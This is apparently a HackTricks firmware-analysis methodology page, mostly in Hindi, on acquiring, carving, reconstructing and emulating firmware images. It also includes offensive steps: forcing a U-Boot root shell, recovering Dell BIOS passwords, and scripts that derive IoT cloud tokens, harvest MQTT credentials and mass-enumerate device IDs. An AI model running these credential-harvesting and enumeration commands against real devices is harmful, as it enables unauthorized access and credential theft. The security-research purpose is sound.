# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **परिचय**

### संबंधित संसाधन

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware वह आवश्यक सॉफ़्टवेयर है जो hardware components और उपयोगकर्ताओं के साथ इंटरैक्ट करने वाले software के बीच संचार को प्रबंधित और सुगम बनाकर devices को सही ढंग से काम करने में सक्षम बनाता है। इसे स्थायी memory में संग्रहीत किया जाता है, जिससे device के चालू होते ही वह महत्वपूर्ण निर्देशों तक पहुँच सके और operating system शुरू हो सके। सुरक्षा कमजोरियों की पहचान करने के लिए firmware की जाँच करना और उसमें संभावित बदलाव करना एक महत्वपूर्ण कदम है।<sup>[[2]](#references)[[3]](#references)</sup>

## **जानकारी जुटाना**

**जानकारी जुटाना** किसी device की संरचना और उसमें उपयोग की गई technologies को समझने का एक महत्वपूर्ण शुरुआती कदम है। इस प्रक्रिया में निम्नलिखित डेटा एकत्र करना शामिल है:

- CPU architecture और उस पर चलने वाला operating system
- Bootloader की जानकारी
- Hardware layout और datasheets
- Codebase के मेट्रिक्स और source locations
- External libraries और license types
- Update history और regulatory certifications
- Architecture और flow diagrams
- Security assessments और पहचानी गई vulnerabilities

इस काम के लिए **open-source intelligence (OSINT)** tools बहुत उपयोगी हैं। उपलब्ध open-source software components की manual और automated समीक्षा भी की जा सकती है। [Coverity Scan](https://scan.coverity.com) और [Semmle’s LGTM](https://lgtm.com/#explore) जैसे tools मुफ़्त static analysis देते हैं, जिनका उपयोग संभावित समस्याएँ खोजने के लिए किया जा सकता है।

## **Firmware प्राप्त करना**

Firmware प्राप्त करने के कई तरीके हैं, जिनमें से हर एक की जटिलता अलग-अलग होती है:

- स्रोत (developers, manufacturers) से **सीधे**
- दिए गए निर्देशों के अनुसार **बनाकर**
- आधिकारिक support sites से **डाउनलोड करके**
- host की गई firmware files खोजने के लिए **Google dork** queries का उपयोग करके
- [S3Scanner](https://github.com/sa7mon/S3Scanner) जैसे tools से **cloud storage** तक सीधे पहुँचकर
- man-in-the-middle techniques से **updates** को intercept करके
- **UART**, **JTAG** या **PICit** जैसे connections के ज़रिए device से **निकालकर**
- device communication में update requests को **sniff करके**
- **hardcoded update endpoints** की पहचान करके और उनका उपयोग करके
- bootloader या network से **dump करके**
- अन्य सभी तरीके विफल होने पर, उपयुक्त hardware tools का उपयोग करके storage chip को **निकालकर और पढ़कर**

### केवल UART logs: flash में U-Boot env के ज़रिए root shell को मजबूर करना

अगर UART RX को अनदेखा किया जाता है (सिर्फ logs मिलते हैं), तो भी आप offline **U-Boot environment blob में बदलाव करके** init shell को मजबूर कर सकते हैं:<sup>[[6]](#references)</sup>

1. SOIC-8 clip और programmer (3.3V) से SPI flash dump करें:
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. U-Boot env partition का पता लगाएँ, `bootargs` में `init=/bin/sh` जोड़ने के लिए उसे संपादित करें, और **blob के लिए U-Boot env CRC32 फिर से compute करें**।
3. केवल env partition को फिर से flash करके reboot करें; UART पर shell दिखाई देना चाहिए।

यह उन embedded devices में उपयोगी है जहाँ bootloader shell disabled है, लेकिन external flash access के ज़रिए env partition में लिखा जा सकता है।

## फर्मवेयर का विश्लेषण

अब जब आपके पास **फर्मवेयर है**, तो आपको यह जानने के लिए उससे जानकारी निकालनी होगी कि इसके साथ कैसे काम करना है। इसके लिए आप कई अलग-अलग टूल इस्तेमाल कर सकते हैं:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

अगर इन टूल्स से ज़्यादा कुछ न मिले, तो `binwalk -E <bin>` से इमेज की **entropy** जाँचें। अगर entropy कम है, तो संभवतः यह encrypted नहीं है। अगर entropy ज़्यादा है, तो संभवतः यह encrypted है (या किसी तरह compressed है)।

इसके अलावा, **firmware के अंदर एम्बेडेड फ़ाइलें** निकालने के लिए आप इन टूल्स का उपयोग कर सकते हैं:

{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

या फ़ाइल का निरीक्षण करने के लिए [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) का उपयोग करें।

### डिफरेंशियल फ्लैश विश्लेषण और पुनर्प्राप्त किए जा सकने वाले XOR सीक्रेट स्टोर

जब किसी firmware setting का storage format documented न हो, तो पहले एक जैसी flash reads कई बार लें, **ठीक एक** setting बदलें, फिर पूरी chip को दोबारा dump करें और offsets की तुलना करें। नियंत्रित मानों के साथ प्रयोग दोहराने से setting को counters और write metadata से अलग पहचाना जा सकता है; अगर बदलाव उसी जगह होने के बजाय नए offsets पर हों, तो इसका संकेत append-only या log-structured store का है। हटाई गई/tombstoned entries को बनाए रखें, क्योंकि उनका payload bytes अब भी recover किए जा सकते हैं।<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

क्षेत्र का पता लगाने के बाद, `binwalk` जैसे tools से firmware modules निकालें और Ghidra में writer/validator को reverse करें। ciphertext patterns से केवल scheme का अनुमान लगाने के बजाय, code में field boundaries, padding, key indexing और key derivation की पुष्टि करें।<sup>[[12]](#references)</sup>

#### एन्क्रिप्टेड zero padding से keys पुनर्प्राप्त करें

जैसा कि [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption) में बताया गया है, ज्ञात plaintext से समान offsets पर keystream bytes का पता चलता है। Repeating XOR key के हर index तक फैली zero padding वाला fixed-size field विशेष रूप से असुरक्षित होता है: एन्क्रिप्टेड padding सीधे उन key bytes को उजागर करती है, क्योंकि `0x00 XOR key_byte = key_byte`। यदि key के हर index को कवर किया गया हो, तो ciphertext tail से key को पुनर्निर्मित करें और भरे हुए bytes को decrypt करें।<sup>[[12]](#references)</sup>

Dell का असुरक्षित DVAR BIOS-password format इसका ठोस उदाहरण है: 32-byte field का byte `0` plaintext होता है, जबकि bytes `1..31` में repeating 20-byte key का उपयोग होता है।<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

पासवर्ड की लंबाई `L` होने पर, XOR से पहले `L..31` स्थितियाँ शून्य थीं। जब `L <= 12` होता है, तो ये स्थितियाँ हर key index को कवर करती हैं, इसलिए बिना brute force के पूरी key और पासवर्ड वापस प्राप्त किए जा सकते हैं:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### पुराने रिकॉर्ड से keys निकालें

हर रिकॉर्ड का अलग-अलग विश्लेषण न करें। DVAR key लगभग `modified_md5(device_seed || variable_GUID || password[0])` से प्राप्त होती है: device seed और GUID स्थिर होते हैं, और password पर निर्भर एकमात्र input उसका clear first byte होता है। इससे हर device के लिए अधिकतम 256 keys बनती हैं और एक ही byte से शुरू होने वाले रिकॉर्ड एक ही key साझा करते हैं। उस byte के अनुसार active और deleted रिकॉर्ड को समूहित करें; एक छोटा ऐतिहासिक रिकॉर्ड padding के ज़रिए पूरी key leak कर सकता है और ऐसे मौजूदा लंबे रिकॉर्ड को decrypt कर सकता है जिसकी अपनी padding पर्याप्त न हो। इसलिए, पुरानी ciphertext को मिटाने के बजाय tombstone करने पर password rotation से जोखिम बढ़ सकता है।<sup>[[12]](#references)</sup>

[`dellpwn`](https://github.com/R3n5k1/dellpwn) टूल DVAR खोजता है, संभावित रिकॉर्ड को validate करता है, passwords रिकवर करता है और raw stored/key bytes दिखा सकता है। इसे checkout से build करें और verified flash image को इस तरह scan करें:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Custom parsers के लिए, record structure, printable-character constraints, zero-padding checks, key entropy और key के wrap होने पर consistency का उपयोग करके false positives को reject करें। यदि बार-बार लिए गए dumps में हर write पर कुछ ही bit flips दिखें, तो देखे गए masks की सूची बनाएँ और इन constraints के आधार पर corrections को rank करें, लेकिन heuristic output को exact recovery के रूप में पेश करने के बजाय ambiguous characters की रिपोर्ट करें।<sup>[[12]](#references)</sup>

Password verifiers में reversible ciphertext के बजाय salted, iterated one-way hash store होना चाहिए, और log-structured stores को superseded secret material को सुरक्षित रूप से हटाना चाहिए।<sup>[[12]](#references)</sup>

### फ़ाइल सिस्टम प्राप्त करना

ऊपर बताए गए tools, जैसे `binwalk -ev <bin>`, से आप **फ़ाइल सिस्टम extract** कर पाए होंगे।\
Binwalk आमतौर पर इसे **फ़ाइल सिस्टम के प्रकार के नाम वाले folder** में extract करता है। यह आमतौर पर इनमें से एक होता है: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### फ़ाइल सिस्टम को मैन्युअल रूप से Extract करना

कभी-कभी, binwalk के signatures में फ़ाइल सिस्टम का **magic byte नहीं होता**। ऐसे मामलों में, binwalk का उपयोग करके **फ़ाइल सिस्टम का offset ढूँढें और binary से compressed फ़ाइल सिस्टम carve करें**, फिर नीचे दिए गए steps के अनुसार उसके प्रकार के आधार पर फ़ाइल सिस्टम को **मैन्युअल रूप से extract करें**।

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

निम्नलिखित **dd command** चलाकर Squashfs filesystem को carve करें।

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

वैकल्पिक रूप से, निम्नलिखित कमांड भी चलाई जा सकती है।

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs के लिए (ऊपर दिए गए उदाहरण में इस्तेमाल किया गया)

`$ unsquashfs dir.squashfs`

इसके बाद फ़ाइलें "`squashfs-root`" डायरेक्टरी में होंगी।

- CPIO archive फ़ाइलों के लिए

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 filesystems के लिए

`$ jefferson rootfsfile.jffs2`

- NAND flash वाले ubifs filesystems के लिए

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### विभाजित embedded root filesystems का पुनर्निर्माण

अगर raw eMMC/SSD dump में filesystem का valid header हो, लेकिन उसके metadata offsets nominal partition की सीमा से आगे तक फैले हों, तो उसे तुरंत corrupt न मानें। Embedded boot code, Device Mapper के ज़रिए कई physical ranges से असली root device को assemble कर सकता है। इसलिए, एक GPT partition को carve करने पर केवल पहला segment मिलता है।<sup>[[9]](#references)</sup>

#### पूरे media image की जाँच करें

पहले पुष्टि करें कि acquisition पूरा हो चुका है, image का आकार स्थिर है और कोई writer अब भी उसे इस्तेमाल नहीं कर रहा है। अगर filename में start/end address दिए गए हैं, तो उस range की तुलना वास्तविक byte count से करें। GPT को read-only mode में recover करें और केवल ज़रूरी range को attach करें; workstation पर किसी untrusted physical volume के लिए `vgchange -ay` **न चलाएँ**, क्योंकि इससे volume-group collisions हो सकते हैं और अनचाहे writes हो सकते हैं।<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

जब मूल init logic या LVM stack को पूरी image देखनी हो, तो disposable VM का उपयोग करना बेहतर है। Standard boot partition के ऐतिहासिक boot logs खास तौर पर उपयोगी होते हैं: bootloader ने proprietary-container offsets, component lengths, slot selection, alignment rules और signature verification के बारे में log किया हो सकता है। इन मानों का उपयोग करके embedded command line/kernel/initramfs को carve करें, फिर `file`, magic bytes और `binwalk` से हर output को स्वतंत्र रूप से validate करें; container के अंत तक पढ़ने से kernel के साथ गलती से initrd, ACPI object या signature जुड़ सकता है।<sup>[[9]](#references)</sup>

#### Boot-time block map को रिकवर करें

Kernel का initramfs extract करें और उसके `/init` तथा किसी भी storage library को reverse करें। [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) में, `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` और partition paths के string references खोजें; फिर उस code को trace करें जो active A/B slot चुनता है और table बनाता है। radare2 में शुरुआत के लिए ये उपयोगी हैं: `r2 -A init`, `afl`, `pdf @ main` और `pdf @ fcn.xxxxx`।<sup>[[9]](#references)</sup>

Linear target, virtual device की लगातार ranges को एक या अधिक backing devices की ranges पर map करता है। Recover की गई two-segment table का आकार आम तौर पर ऐसा होता है (सभी positions और lengths 512-byte sectors में हैं):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Machine-code arithmetic को ठीक उसी तरह दोहराएँ, जिसमें integer width, shifts और unit conversions शामिल हैं। उदाहरण के लिए, निम्नलिखित expression byte size को 512-byte sectors में बदलने से पहले 4-KiB boundary तक floor करता है; इसे `p4_bytes // 512` से बदलने पर, जब partition page-aligned न हो, चुना गया tail `p4_bytes % 4096` से खिसक जाता है।<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

GPT-व्युत्पन्न offsets, उलटे sector counts और परिणामी output length को अलग-अलग assertions के रूप में रखते हुए, पूरी media dump को memory में load करने के बजाय table के क्रम में सीमित chunks कॉपी करके एक flat analysis image पुनर्निर्मित करें। इससे host-side mapper devices बनाने से भी बचा जा सकता है।<sup>[[9]](#references)</sup>

#### corruption और constant reconstruction error में अंतर करें

SquashFS के लिए, `unsquashfs` चलाने से पहले `hsqs` magic जाँचें और superblock offset 40 पर little-endian 64-bit `bytes_used` field को decode करें। यदि कई असंबंधित structures में extraction विफल हो, तो अपेक्षित positions के आसपास एक व्यापक window में खोजें और मजबूत structural candidates की आवश्यकता रखें: decompressible metadata block, कई लगातार valid directory entries, plausible inode fields, inode count के अनुरूप root inode, या valid integrity-metadata structure। केवल एक magic match पर्याप्त नहीं है।<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

जब वही signed delta अलग-अलग structures को valid बनाता है—उदाहरण के लिए, directory metadata और verity record—तो संभावित कारण bytes की कमी के बजाय segment-start में कोई व्यवस्थित त्रुटि होती है। orphan recovery या filesystem metadata को patch करने से पहले, उलटी गई arithmetic पर लौटें और देखें कि कहीं remainders को छोड़ा तो नहीं गया, signedness या overflow की समस्या तो नहीं है, या sector/page rounding तो नहीं हुई।<sup>[[9]](#references)</sup>

अंत में, सुरक्षा की सीमाओं को अलग रखें: TPM-sealed LUKS volumes डेटा की गोपनीयता की रक्षा करते हैं, जबकि signed dm-verity mapping root-filesystem की अखंडता की रक्षा करती है। Software TPM, original physical TPM से sealed key को recover नहीं कर सकता। इसी तरह, verity verification को छोड़ने वाले research-only init के ज़रिए modified SquashFS को boot करने से उसका signature forge नहीं होता और न ही dm-verity टूटता है।<sup>[[9]](#references)</sup>

## Firmware का विश्लेषण

Firmware प्राप्त हो जाने के बाद, उसकी संरचना और संभावित vulnerabilities को समझने के लिए उसका विश्लेषण करना ज़रूरी है। इस प्रक्रिया में firmware image का विश्लेषण करने और उससे उपयोगी डेटा निकालने के लिए विभिन्न tools का उपयोग किया जाता है।

### शुरुआती विश्लेषण के Tools

Binary file (जिसे `<bin>` कहा गया है) की शुरुआती जाँच के लिए commands का एक सेट दिया गया है। ये commands file types की पहचान करने, strings निकालने, binary data का विश्लेषण करने और partition तथा filesystem की जानकारी समझने में मदद करती हैं:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

इमेज की encryption स्थिति का आकलन करने के लिए, `binwalk -E <bin>` से **entropy** जाँची जाती है। कम entropy, encryption की कमी का संकेत देती है, जबकि अधिक entropy संभावित encryption या compression का संकेत देती है।

**embedded files** निकालने के लिए, **file-data-carving-recovery-tools** documentation और फ़ाइलों की जाँच के लिए **binvis.io** जैसे tools और resources की सिफ़ारिश की जाती है।

### फ़ाइल सिस्टम निकालना

`binwalk -ev <bin>` का उपयोग करके, आमतौर पर फ़ाइल सिस्टम निकाला जा सकता है। यह अक्सर फ़ाइल सिस्टम के प्रकार (जैसे squashfs, ubifs) के नाम वाली directory में निकाला जाता है। हालाँकि, missing magic bytes के कारण **binwalk** फ़ाइल सिस्टम के प्रकार को पहचानने में विफल हो, तो manual extraction करना आवश्यक है। इसमें `binwalk` से फ़ाइल सिस्टम का offset ढूँढ़ना और फिर फ़ाइल सिस्टम को carve out करने के लिए `dd` command का उपयोग करना शामिल है:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

इसके बाद, फ़ाइल सिस्टम के प्रकार (जैसे squashfs, cpio, jffs2, ubifs) के आधार पर, उसकी सामग्री को मैन्युअल रूप से निकालने के लिए अलग-अलग commands का उपयोग किया जाता है।

### फ़ाइल सिस्टम का विश्लेषण

फ़ाइल सिस्टम निकालने के बाद, security flaws की खोज शुरू होती है। असुरक्षित network daemons, hardcoded credentials, API endpoints, update server की कार्यक्षमताओं, uncompiled code, startup scripts और offline analysis के लिए compiled binaries पर ध्यान दिया जाता है।

जाँचने के लिए **मुख्य स्थानों** और **आइटम** में शामिल हैं:

- उपयोगकर्ता credentials के लिए **etc/shadow** और **etc/passwd**
- **etc/ssl** में SSL certificates और keys
- संभावित vulnerabilities के लिए configuration और script files
- आगे के analysis के लिए embedded binaries
- आम IoT device web servers और binaries

कई tools फ़ाइल सिस्टम में संवेदनशील जानकारी और vulnerabilities खोजने में मदद करते हैं:

- संवेदनशील जानकारी खोजने के लिए [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) और [**Firmwalker**](https://github.com/craigz28/firmwalker)
- व्यापक firmware analysis के लिए [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- static और dynamic analysis के लिए [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), और [**EMBA**](https://github.com/e-m-b-a/emba)

### Compiled Binaries पर Security Checks

फ़ाइल सिस्टम में मिले source code और compiled binaries, दोनों की vulnerabilities के लिए जाँच की जानी चाहिए। Unix binaries के लिए **checksec.sh** और Windows binaries के लिए **PESecurity** जैसे tools उन असुरक्षित binaries की पहचान करने में मदद करते हैं जिनका exploit किया जा सकता है।

## Derived URL tokens के ज़रिए cloud config और MQTT credentials हासिल करना

कई IoT hubs अपनी प्रति-device configuration किसी ऐसे cloud endpoint से प्राप्त करते हैं:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Firmware analysis के दौरान आपको पता चल सकता है कि `<token>` को device ID से locally, hardcoded secret का उपयोग करके derive किया जाता है। उदाहरण के लिए:

- token = MD5( deviceId || STATIC_KEY ) और इसे uppercase hex के रूप में दर्शाया जाता है

इस design के कारण, deviceId और STATIC_KEY जानने वाला कोई भी व्यक्ति URL को फिर से बना सकता है और cloud config प्राप्त कर सकता है, जिससे अक्सर plaintext MQTT credentials और topic prefixes उजागर हो जाते हैं।

व्यावहारिक workflow:

1) UART boot logs से deviceId निकालें

- 3.3V UART adapter (TX/RX/GND) कनेक्ट करें और logs capture करें:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- cloud config URL pattern और broker address प्रिंट करने वाली lines खोजें, उदाहरण के लिए:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Firmware से STATIC_KEY और token algorithm प्राप्त करें

- Binaries को Ghidra/radare2 में लोड करें और config path ("/pf/") या MD5 usage खोजें।
- Algorithm की पुष्टि करें (उदाहरण के लिए, MD5(deviceId||STATIC_KEY))।
- Bash में token निकालें और digest को uppercase में बदलें:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Cloud config और MQTT credentials इकट्ठा करें

- URL बनाएं और curl से JSON प्राप्त करें; secrets निकालने के लिए jq से parse करें:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) plaintext MQTT और कमजोर topic ACLs (यदि मौजूद हों) का दुरुपयोग करें

- बरामद credentials का उपयोग करके maintenance topics को subscribe करें और संवेदनशील घटनाओं पर नज़र रखें:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) अनुमानित device IDs की सूची बनाएँ (बड़े पैमाने पर, अनुमति के साथ)

- कई ecosystems में vendor OUI/product/type bytes के बाद sequential suffix शामिल होता है।
- आप candidate IDs को iterate कर सकते हैं, tokens derive कर सकते हैं और programmatically configs fetch कर सकते हैं:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

नोट्स
- Mass enumeration का प्रयास करने से पहले हमेशा स्पष्ट authorization प्राप्त करें।
- जब संभव हो, target hardware में बदलाव किए बिना secrets को पुनर्प्राप्त करने के लिए emulation या static analysis को प्राथमिकता दें।

Firmware को emulate करने की प्रक्रिया से किसी device के operation या किसी individual program का **dynamic analysis** संभव होता है। इस तरीके में hardware या architecture dependencies से जुड़ी चुनौतियाँ आ सकती हैं, लेकिन root filesystem या विशिष्ट binaries को matching architecture और endianness वाले device, जैसे Raspberry Pi, या pre-built virtual machine में transfer करने से आगे की testing में मदद मिल सकती है।

### Individual Binaries का Emulation

एकल programs की जाँच के लिए, program की endianness और CPU architecture की पहचान करना महत्वपूर्ण है।

#### MIPS Architecture का उदाहरण

MIPS architecture binary को emulate करने के लिए, यह command इस्तेमाल की जा सकती है:

```bash
file ./squashfs-root/bin/busybox
```

और आवश्यक emulation tools इंस्टॉल करने के लिए:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

MIPS (big-endian) के लिए `qemu-mips` का उपयोग किया जाता है, और little-endian binaries के लिए `qemu-mipsel` सही विकल्प होगा।

#### ARM Architecture Emulation

ARM binaries के लिए प्रक्रिया समान है; emulation के लिए `qemu-arm` emulator का उपयोग किया जाता है।

### Full System Emulation

[Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) और अन्य टूल्स पूर्ण firmware emulation को आसान बनाते हैं। ये प्रक्रिया को स्वचालित करते हैं और dynamic analysis में मदद करते हैं।

### Emulation के लिए विभाजित और सत्यापित root filesystems का पुनर्निर्माण

अगर SquashFS superblock पढ़ा जा सकता है, लेकिन inode, directory या fragment-table offsets असंभव लगते हैं, तो तुरंत `unsquashfs` को patch न करें। Early boot binary को reverse करें और उसके द्वारा बनाए गए block-device graph को दोहराएँ: embedded systems में एक nominal root partition दिख सकता है, लेकिन असली filesystem `dm-linear` mapping से बनाया जा सकता है, जो दूसरे partition से उधार लिए गए sectors को जोड़ती है। केवल superblock की जाँच सफल हो सकती है, भले ही बाद के सभी metadata blocks अपनी सही जगह से हटे हुए हों।<sup>[[11]](#references)</sup>

Firmware की arithmetic को बिल्कुल उसी तरह रखें। खास तौर पर पता लगाएँ कि lengths bytes, 512-byte sectors या 4 KiB pages में हैं; shifts और truncation को उनके मूल क्रम में दोहराएँ; और A/B layouts में bank पर निर्भर tail regions का ध्यान रखें। उदाहरण के लिए, `(partition_bytes >> 12) << 3` पहले मान को 4 KiB boundary तक truncate करता है और उसके बाद परिणाम को 512-byte sectors में व्यक्त करता है; इसे `partition_bytes // 512` से बदलने पर जोड़ा गया extent कुछ kilobytes खिसक सकता है और आगे की सभी SquashFS tables को corrupt कर सकता है।<sup>[[11]](#references)</sup>

जाँच के लिए यह workflow उपयोगी है:<sup>[[11]](#references)</sup>

1. Verifier/init binary से हर `dm-linear` segment का source device, start sector और length प्राप्त करें।
2. Alignment semantics बदले बिना extents को concatenate या map करें।
3. अगर extraction फिर भी विफल हो, तो अनुमानित boundary के आसपास केवल एक छोटी window में खोजें और अकेले plausible superblock को स्वीकार करने के बजाय लगातार कई valid metadata structures की पुष्टि करें।
4. Reconstructed image पर बिना बदलाव वाला `unsquashfs` चलाएँ; सभी directories और fragments को सफलतापूर्वक traverse करना, `unsquashfs -stat` से अधिक मजबूत प्रमाण है।

#### Analyst-नियंत्रित dm-verity replacement

जब analyst के नियंत्रण में QEMU kernel, initramfs और virtual disks हों, तो vendor के verification PID 1 को एक छोटे statically linked init से बदलकर modified root को boot किया जा सकता है। यह **लैब में boot-chain substitution** है, dm-verity, उसके RSA signature, Secure Boot या TPM-sealed key को तोड़ना नहीं।<sup>[[11]](#references)</sup>

Replacement init को मूल boot path के operational हिस्सों की नकल करनी चाहिए: `devtmpfs` mount करना, `setsid()` call करना, `/dev/console` को file descriptors 0–2 से जोड़ना, `/proc` और `/sys` mount करना, दिए गए block device का इंतज़ार करना, edited root को read-only mount करना, old-root pseudo-filesystems को detach करना, नए mount को `/` पर ले जाना, `chroot` करना और firmware के मूल `/sbin/init` को `execve()` करना। `MS_MOVE` से **पहले** `/dev`, `/proc` और `/sys` को detach करने से नए root से जुड़े mount points गलती से detach नहीं होते।<sup>[[11]](#references)</sup>

Modified immutable root से mutable device state को अलग रखें। qcow2 overlay मूल disk की LVM state को सुरक्षित रख सकता है, जबकि दूसरा read-only virtio disk edited SquashFS उपलब्ध करा सकता है:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Offline image-state debugging

जब slow boots, destructive startup scripts या unreliable console logging के कारण failure का पता लगाना मुश्किल हो, तो guest के बाहर persistent state की जाँच करें। किसी running VM द्वारा उपयोग किए जा रहे overlay को कभी attach न करें; उसे `qemu-nbd` से expose करें, LVM discovery को इच्छित NBD partition तक सीमित रखें और disconnect करने से पहले volume group को deactivate करें।<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

दोहराए जा सकने वाले fault isolation के लिए, किसी स्थिर writable volume में timestamp वाली marker files लिखें और उन्हें offline सत्यापित करें; rate limiting या process के जल्दी बंद होने के कारण `/dev/kmsg`, FIFOs और अस्थायी consoles गलत नकारात्मक परिणाम दे सकते हैं। असंबंधित code बदलने से पहले विभिन्न layers के सटीक interfaces की तुलना भी करें: `uname -r` बनाम `/lib/modules/`, disk पर मौजूद ext4 features बनाम kernel configuration, और Mesa `libGL` generation बनाम DRI driver ABI तथा PCI से प्राप्त driver names। कोई component मौजूद हो सकता है और `dlopen()` भी सफलतापूर्वक हो सकता है, फिर भी वह उपयोगी नहीं होगा क्योंकि उसका consumer किसी अलग ABI की अपेक्षा करता है।<sup>[[11]](#references)</sup>

## व्यवहार में Dynamic Analysis

